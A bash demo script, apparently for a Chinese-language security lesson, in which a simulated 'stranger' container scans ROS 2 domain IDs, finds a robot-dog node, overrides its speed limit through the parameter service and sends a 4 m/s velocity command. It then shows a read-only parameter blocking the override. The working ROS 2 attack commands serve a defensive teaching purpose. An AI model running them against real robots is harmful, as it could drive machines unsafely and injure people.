. "$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/env.sh"
export PSUSER=box
E="-e ROS_DOMAIN_ID=42 -e FASTDDS_BUILTIN_TRANSPORTS=UDPv4"
dog(){ sudo docker rm -f go2 >/dev/null 2>&1; sudo docker run -d --name go2 --network host $E -e RO=$1 -v $PWD:/lab ros:jazzy-ros-core bash -c "source /opt/ros/jazzy/setup.bash; python3 -u /lab/go2_sim.py" >/dev/null; sleep 4; }
stranger(){ printf "\033[1;31mstranger@cafe-laptop\033[0m:\033[1;34m~\033[0m\$ "; type_out "$1"; sleep 0.4; printf '\n'; timeout 40 sudo docker run --rm --network host -e FASTDDS_BUILTIN_TRANSPORTS=UDPv4 -e ROS_DOMAIN_ID=${D:-42} ros:jazzy-ros-core bash -c "source /opt/ros/jazzy/setup.bash; $1" 2>/dev/null; sleep ${2:-2}; }
say "實驗：容器 A = 機器狗 go2_sim（ROS_DOMAIN_ID=42，最高速 1 m/s）"
runp 'dog 0; sudo docker logs go2; echo "go2 up"' 1
say "容器 B = 同網路的陌生筆電。先用預設 domain 0 找："
D=0 stranger 'ros2 node list --no-daemon --spin-time 4; echo "(空的)"' 1.5
say "domain 只是『頻道號碼』，不是密碼。掃 40~42："
stranger 'for d in 40 41 42; do echo "domain $d: $(ROS_DOMAIN_ID=$d ros2 node list --no-daemon --spin-time 4)"; done' 2
say "找到了。讀它的參數（每個節點都自帶參數 service）"
stranger 'ros2 service list --no-daemon --spin-time 4 | grep go2_sim | head -4; ros2 param get --no-daemon /go2_sim max_speed' 2
say "改掉限速：1.0 → 5.0，再叫它衝 4 m/s"
stranger "ros2 service call /go2_sim/set_parameters rcl_interfaces/srv/SetParameters '{parameters: [{name: max_speed, value: {type: 3, double_value: 5.0}}]}' | grep -o 'successful=[A-Za-z]*'; ros2 topic pub --once -w 1 /cmd_vel geometry_msgs/msg/Twist '{linear: {x: 4.0}}' >/dev/null" 1
runp 'sudo docker logs go2 | tail -1' 3
say "防線 1：安全相關參數設成 read_only，重開狗再試一次"
runp 'dog 1; echo "go2 up (read_only max_speed)"' 1
stranger "ros2 service call /go2_sim/set_parameters rcl_interfaces/srv/SetParameters '{parameters: [{name: max_speed, value: {type: 3, double_value: 5.0}}]}' | grep -o -E 'successful=[A-Za-z]*|reason=.[^)]*'; ros2 topic pub --once -w 1 /cmd_vel geometry_msgs/msg/Twist '{linear: {x: 4.0}}' >/dev/null" 1
runp 'sudo docker logs go2 | tail -1' 3
say "限速守住了。但 cmd_vel 還是誰都能送 → 防線 2：SROS2 加密＋存取控制"
sudo docker rm -f go2 >/dev/null 2>&1
